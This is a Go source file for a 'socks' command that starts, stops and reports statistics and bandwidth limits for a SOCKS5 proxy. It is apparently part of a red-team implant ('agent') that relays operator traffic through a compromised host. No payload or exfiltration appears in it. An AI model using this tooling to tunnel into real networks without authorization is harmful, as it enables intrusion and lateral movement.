package commands

import (
	"fmt"

	"fawkes/pkg/socks"
	"fawkes/pkg/structs"
)

// SocksCommand implements the socks command
type SocksCommand struct{}

type socksArgs struct {
	Action       string `json:"action"`
	Port         int    `json:"port"`
	BandwidthKBs int    `json:"bandwidth_kbs"` // per-connection bandwidth limit in KB/s (0 = unlimited)
}

func (c *SocksCommand) Name() string {
	return "socks"
}

func (c *SocksCommand) Description() string {
	return "Start, stop, or view stats for the SOCKS5 proxy"
}

// gSocksManager holds a reference to the active SOCKS manager for stats access.
// Set by RegisterSocksManager during agent initialization.
var gSocksManager *socks.Manager

// RegisterSocksManager stores a reference to the SOCKS manager for stats access.
func RegisterSocksManager(m *socks.Manager) {
	gSocksManager = m
}

func (c *SocksCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[socksArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	switch params.Action {
	case "start":
		if gSocksManager != nil && params.BandwidthKBs > 0 {
			gSocksManager.SetBandwidthLimit(int64(params.BandwidthKBs) * 1024)
		}
		msg := fmt.Sprintf("[+] SOCKS5 proxy active on server port %d. Agent is processing proxy traffic (TCP + UDP relay).", params.Port)
		if params.BandwidthKBs > 0 {
			msg += fmt.Sprintf(" Bandwidth limit: %d KB/s per connection.", params.BandwidthKBs)
		}
		return successResult(msg)
	case "stop":
		if gSocksManager != nil {
			gSocksManager.SetBandwidthLimit(0)
		}
		return successf("[+] SOCKS5 proxy on port %d stopped.", params.Port)
	case "stats":
		return socksStats()
	case "bandwidth":
		return socksBandwidth(params.BandwidthKBs)
	default:
		return errorf("Unknown action: %s (use 'start', 'stop', 'stats', or 'bandwidth')", params.Action)
	}
}

func socksStats() structs.CommandResult {
	if gSocksManager == nil {
		return errorResult("SOCKS manager not initialized")
	}
	return successResult(gSocksManager.Stats.Summary())
}

func socksBandwidth(kbs int) structs.CommandResult {
	if gSocksManager == nil {
		return errorResult("SOCKS manager not initialized")
	}
	if kbs <= 0 {
		gSocksManager.SetBandwidthLimit(0)
		return successResult("[+] Bandwidth limiting disabled.")
	}
	gSocksManager.SetBandwidthLimit(int64(kbs) * 1024)
	return successf("[+] Bandwidth limit set to %d KB/s per connection.", kbs)
}
